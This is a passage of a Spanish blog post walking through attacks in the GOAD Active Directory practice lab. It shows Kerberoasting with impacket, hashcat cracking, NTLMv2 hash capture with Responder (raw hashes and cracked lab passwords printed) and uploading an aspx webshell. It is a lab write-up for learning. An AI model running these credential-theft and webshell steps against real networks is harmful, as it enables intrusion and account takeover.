---
layout: single
title: Game of Active Directory - Parte 2
excerpt: "En esta segunda parte veremos como seguir obteniendo credenciales con la vulnerabilidad *kerberoasting* y con el *responder*. Además utilizaré sliver c2 framework para obtener la intrusión inicial y elevar privilegios."
date: 2024-03-30
classes: wide
header:
  teaser: /assets/images/Goad/logo_GOAD.jpg
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Active Directory
---

![](/assets/images/Goad/logo_GOAD.jpg)

En esta segunda parte veremos como seguir obteniendo credenciales con la vulnerabilidad *kerberoasting* y con el *responder*. Además utilizaré sliver c2 framework para obtener la intrusión inicial y elevar privilegios.


## Kerberoasting

Podemos utilizar impacket para intentar explotar esta vulnerabilidad, que se da cuando algún usuario del dominio tiene asociado un SPN. 

```bash
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```

![](/assets/images/Goad/kerberoasting.jpg)


Obtenemos 3 hashes que corresponden a los usuarios sansa.stark, jon.snow y sql_svc. Y ahora podemos intentar crackearlos con hashcat.

```bash
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```


![](/assets/images/Goad/hashcat_kerb.jpg)


Ya tenemos otra credencial: `jon.snow:iknownothing`


## Responder

Otra forma de obtener credenciales es utilizar el responder. En el laboratorio, hay dos bots para simular solicitudes LLMRN, MDNS y NBT-NS. Un usuario tiene una contraseña débil pero no tiene derechos de administrador. Otro usuario tiene derechos de administrador pero utiliza una contraseña segura.

```bash
Responder.py -I vboxnet0
```

Unos minutos después de ejecutar el comando obtenemos el hash de robb.stark, y casi enseguida el de eddard.stark.


![](/assets/images/Goad/responder.jpg)


![](/assets/images/Goad/responder2.jpg)


Creamos un fichero con los hashes y lo llamamos responder.hashes

```bash
robb.stark::NORTH:1122334455667788:6129792269DA2B384291D78832A3CB8B:010100000000000080064CF99882DA01DBB2B43D9C8710FC0000000002000800450050003700470001001E00570049004E002D004F0046004A00570045004E005600340052004300470004003400570049004E002D004F0046004A00570045004E00560034005200430047002E0045005000370047002E004C004F00430041004C000300140045005000370047002E004C004F00430041004C000500140045005000370047002E004C004F00430041004C000700080080064CF99882DA010600040002000000080030003000000000000000000000000030000030D7D6EB9AD53D0DAD5FC7B07BC5EAE7197E455313339361BDB344C3047DDDFC0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
eddard.stark::NORTH:1122334455667788:AE03B15A5FECA78DB6AC6BA1FB502DA6:010100000000000080064CF99882DA01C4AD3FED532C0B650000000002000800450050003700470001001E00570049004E002D004F0046004A00570045004E005600340052004300470004003400570049004E002D004F0046004A00570045004E00560034005200430047002E0045005000370047002E004C004F00430041004C000300140045005000370047002E004C004F00430041004C000500140045005000370047002E004C004F00430041004C000700080080064CF99882DA010600040002000000080030003000000000000000000000000030000030D7D6EB9AD53D0DAD5FC7B07BC5EAE7197E455313339361BDB344C3047DDDFC0A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
```


Y los intentamos crackear con hashcat.

```bash
hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
```

![](/assets/images/Goad/hashcat_resp.jpg)

Y obtenemos otra credencial `robb.stark:sexywolfy`


## Acceso inicial

Enumerando los servicios web vemos que en el servidor castleblack hay una página que permite una subida de archivos. Así que subimos una webshell en formato aspx.


![](/assets/images/Goad/upload.jpg)


![](/assets/images/Goad/webshell.jpg)


![](/assets/images/Goad/webshell2.jpg)

